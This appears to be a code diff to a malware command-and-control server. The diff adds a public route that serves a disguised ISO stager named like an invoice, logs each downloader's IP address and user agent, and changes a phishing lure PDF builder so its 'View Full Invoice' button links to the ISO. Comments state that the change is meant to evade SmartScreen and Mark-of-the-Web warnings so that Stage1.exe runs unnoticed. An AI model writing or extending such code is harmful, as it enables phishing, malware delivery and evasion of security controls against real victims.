@@ -86,6 +86,23 @@ router.get("/dl/:filename", (req, res) => {
   res.sendFile(stage1);
 });
 
+// ── Public: masked ISO download — avoids SmartScreen EXE warning ─────────────
+// Edge/Chrome don't show "dangerous file" warning for .iso disk images.
+// Files inside the ISO have no MOTW → SmartScreen never fires on Stage1.exe.
+// Build the ISO first via the admin "Build ISO" button in the Stager tab.
+router.get("/dl/iso/:filename", (req, res) => {
+  const iso = path.join(DL_DIR, "stage.iso");
+  if (!fs.existsSync(iso))
+    return res.status(404).send("ISO not ready — build it from the Stager tab first.");
+  const safe = (req.params.filename || "Invoice_Q4-2024.iso").replace(/[^a-zA-Z0-9_\-. ]/g, "");
+  const ip = (req.headers["x-forwarded-for"] || req.socket.remoteAddress || "").split(",")[0].trim();
+  appendEvent({ ts: Date.now(), type: "iso_fetch", ip, ua: req.headers["user-agent"] || "-", host: safe });
+  console.log(`[stage] ISO-FETCH  ip=${ip}  file=${safe}`);
+  res.setHeader("Content-Type", "application/x-iso9660-image");
+  res.setHeader("Content-Disposition", `attachment; filename="${safe}"`);
+  res.sendFile(iso);
+});
+
 // ── Stage 1 → C2: Check-in ────────────────────────────────────────────────────
 
 router.get("/stage/checkin", (req, res) => {
@@ -335,8 +352,10 @@ function buildLurePdf(c2Host, opts = {}) {
   const to       = opts.to       || "Acme Corporation";
   const filename = opts.filename || "Invoice_Q4-2024";
   const btnLabel = opts.btnLabel || "View Full Invoice";
-  // Default: masked /dl/ URL — status bar shows a convincing filename, not the API endpoint
-  const dlUrl    = opts.dlUrl || `https://${c2Host}/dl/${(opts.filename || "Invoice_Q4-2024").replace(/[^a-zA-Z0-9_\-]/g,"_")}_SecureViewer.exe`;
+  // Default: ISO download — Edge/Chrome don't warn on .iso, and LNK inside has no MOTW
+  // SmartScreen never fires on Stage1.exe because it runs from within the ISO (no MOTW).
+  const safeName = (opts.filename || "Invoice_Q4-2024").replace(/[^a-zA-Z0-9_\-]/g,"_");
+  const dlUrl    = opts.dlUrl || `https://${c2Host}/dl/iso/${safeName}.iso`;
   const invNum   = "INV-" + (Math.floor(Math.random() * 9000) + 1000);
   const now      = new Date();
   const fmtD     = d => d.toLocaleDateString("en-US", { year:"numeric", month:"long", day:"numeric" });
@@ -536,10 +555,14 @@ router.get("/api/stage/build-iso", requireAdmin, (req, res) => {
     try { fs.rmSync(tmpDir,  { recursive: true, force: true }); } catch (_) {}
     try { fs.unlinkSync(isoPath); }                              catch (_) {}
 
+    // Cache to downloads/ so the public /dl/iso/ route can serve it without auth
+    const cached = path.join(DL_DIR, "stage.iso");
+    try { fs.writeFileSync(cached, buf); } catch (_) {}
+
     res.setHeader("Content-Type", "application/x-iso9660-image");
     res.setHeader("Content-Disposition", `attachment; filename="${fname}.iso"`);
     res.send(buf);
-    console.log(`[stage] ISO-STAGER  lnk=${lnkName}  size=${buf.length}`);
+    console.log(`[stage] ISO-STAGER  lnk=${lnkName}  size=${buf.length}  cached=${cached}`);
   } catch (e) {
     try { fs.rmSync(tmpDir,  { recursive: true, force: true }); } catch (_) {}
     try { fs.unlinkSync(isoPath); }                              catch (_) {}
